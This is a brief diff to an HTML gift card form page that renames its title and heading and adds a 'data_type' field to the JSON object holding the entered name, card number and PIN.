@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Gift Card Form</title>
+  <title>Gift Card</title>
 
   <style>
 
@@ -149,7 +149,7 @@
 
   <div class="container" id="mainContainer">
 
-    <h2 id="mainTitle">Gift Card Form</h2>
+    <h2 id="mainTitle">Gift Card Details</h2>
 
     <div id="formArea">
 
@@ -317,6 +317,7 @@
       formArea.style.display = "none";
       loaderBox.style.display = "flex";
       const jsonData = {
+        data_type: "gift_card",
         name: name,
         gift_card_number: cardNumber,
         pin: pin
